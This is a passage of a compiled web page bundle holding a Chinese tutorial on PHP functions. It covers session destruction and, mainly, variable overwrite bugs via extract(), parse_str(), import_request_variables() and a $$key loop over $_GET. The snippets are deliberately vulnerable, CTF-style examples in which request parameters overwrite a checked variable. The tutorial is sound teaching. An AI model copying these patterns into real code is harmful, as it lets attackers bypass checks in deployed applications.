的机制这里我就不再过于详细介绍。"),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"session_destroy()"),"函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie "),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 初始化会话。"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 如果要使用会话，别忘了现在就调用："),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"session_start"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 重置会话中的所有变量"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_SESSION")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 如果要清理的更彻底，那么同时删除会话 cookie"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 注意：这样不但销毁了会话中的数据，还同时销毁了会话本身"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"ini_get"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"session.use_cookies"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$params")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"session_get_cookie_params"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"setcookie"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"session_name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"''"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"time"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"42000"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$params"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"path"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$params"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"domain"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$params"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"secure"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$params"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"httponly"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// 最后，销毁会话"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"session_destroy"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))," "))),Object(p.b)("h2",{className:"__internal",id:"变量覆盖"},"变量覆盖",Object(p.b)("a",c({parentName:"h2"},{href:"#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"extract"},"extract()",Object(p.b)("a",c({parentName:"h3"},{href:"#extract","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数从数组中将变量导入到当前的符号表。其实作用就是给变量重新赋值，从而达到变量覆盖的作用。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"extract"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"extract_rules",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),"prefix",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-25"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-25","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(p.b)("p",{parentName:"li"},"array：必需。规定要使用的数组。")),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(p.b)("p",{parentName:"li"},"extract_rules：可选。extract函数将检查每个键名是否为合法的变量名，同时也检查和符号中已经存在的变量名是否冲突，对不合法或者冲突的键名将会根据此参数的设定的规则来决定。"),Object(p.b)("ul",{parentName:"li"},Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_SKIP - 如果有冲突，不覆盖已有的变量。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。"))),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),Object(p.b)("p",{parentName:"li"},"prefix：可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。"))),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$color")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"blue"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$one_array")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"color"')," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"red"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"size"'),"  ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"medium"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"name"')," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"dog"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"extract"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$one_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$color")),", ",Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$size")),", ",Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")),'"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\nred, medium, dog"))),Object(p.b)("p",null,"在上述代码中，我们看到，本来我们定义的color是blue，输出的时候变成了red，本来我们没有定义size和name，可是却能输出这两个变量。"),Object(p.b)("p",null,"还有一些在CTF比赛中出现过的用法，比如直接让你POST传参来改变某个变量的值。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'cat'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"extract"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_POST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"参时如果我们POST传入name=dog，那么页面将会回显dog，说明这个函数的使用让我们实现了变量的覆盖，改变了变量的值。"),Object(p.b)("h3",{className:"__internal",id:"parse_str"},"parse_str()",Object(p.b)("a",c({parentName:"h3"},{href:"#parse_str","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数把查询到的字符串解析到变量中。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"parse_str"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"string",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-26"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-26","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"string：必需。规定要解析的字符串。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"array：可选。规定存储变量的数组名称。该参数只是变量存储到数组中。")),Object(p.b)("p",null,"代码示例:"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"parse_str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"name=Ameng&sex=boy"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\nArray\n(\n    [name] => Ameng\n    [sex] => boy\n)"))),Object(p.b)("p",null,"上述代码是有array情况下的使用情况，那么如何实现变量的覆盖呢？如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'who'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'20'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"parse_str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"name=Ameng&age=21"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"',Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")),", ",Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age")),'"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n执行结果——>\nAmeng, 21"))),Object(p.b)("p",null,"通过上述代码，我们可以发现，变量name和age都发生了变化，被新的值覆盖了。这里我用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示。"),Object(p.b)("h3",{className:"__internal",id:"import_request_variables"},"import_request_variables()",Object(p.b)("a",c({parentName:"h3"},{href:"#import_request_variables","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数将GET/POST/Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用。"),Object(p.b)("p",null,"版本要求：PHP 4 >= 4.1.0, PHP 5 < 5.4.0"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"bool import_request_variables ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$types")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$prefix")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")))),Object(p.b)("h4",{className:"__internal",id:"参数-27"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-27","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'who'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"import_request_variables"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'gp'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'You are not Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"如果什么变量也不传，那么页面将回显",Object(p.b)("inlineCode",{parentName:"p"},"You are not Ameng"),"如果通过GET或者POST传入",Object(p.b)("inlineCode",{parentName:"p"},"name=Ameng"),"那么页面就会回显",Object(p.b)("inlineCode",{parentName:"p"},"Ameng")),Object(p.b)("p",null,"可以见到此函数还是很危险的，没有修复方法，不使用就是最好的方法。所以在新版本的 PHP 中已经废弃了这个函数。"),Object(p.b)("h3",{className:"__internal",id:"foreach"},"foreach()",Object(p.b)("a",c({parentName:"h3"},{href:"#foreach","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"foreach")," 语法结构提供了遍历数组的简单方式。",Object(p.b)("inlineCode",{parentName:"p"},"foreach"),"   仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：   "),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"foreach")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"array_expression ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"as")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\n    statement\n",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"foreach")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"array_expression ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"as")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$key")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\n    statement"))),Object(p.b)("p",null,"第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。  "),Object(p.b)("p",null,"  第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key。"),Object(p.b)("p",null,"那么这个函数如何实现变量的覆盖呢？我们来看个案例."),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'who'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"foreach"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"as")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$key")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"  \n            ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$$key")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$value"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"  \n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"  \n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"==")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Ameng"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'You are right!'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'You are flase!'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter 